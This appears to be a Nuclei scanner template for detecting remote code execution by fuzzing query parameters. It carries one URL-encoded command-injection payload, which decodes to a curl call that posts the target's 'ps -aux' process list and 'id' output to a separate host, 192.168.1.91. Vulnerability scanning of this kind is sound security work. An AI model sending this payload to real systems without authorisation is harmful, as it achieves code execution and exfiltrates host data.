id: fuzz-rce-custom

info:
  name: Custom RCE Detection
  author: netbaan
  severity: critical
  description: |
    This template is designed to detect Remote Code Execution (RCE) vulnerabilities using a specified payload.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Modify if needed for other HTTP methods

    payloads:
      rce:
        - "curl%2520-X%2520POST%2520--data%2520%22%24%28ps%2520-aux%29%22%2520192.168.1.91%2F%3F%60id%60"

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{rce}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "uid="  # Using uid or other expected output from ps command to confirm execution

      - type: word
        part: header
        words:
          - "text/html"  # Adjust if the header type differs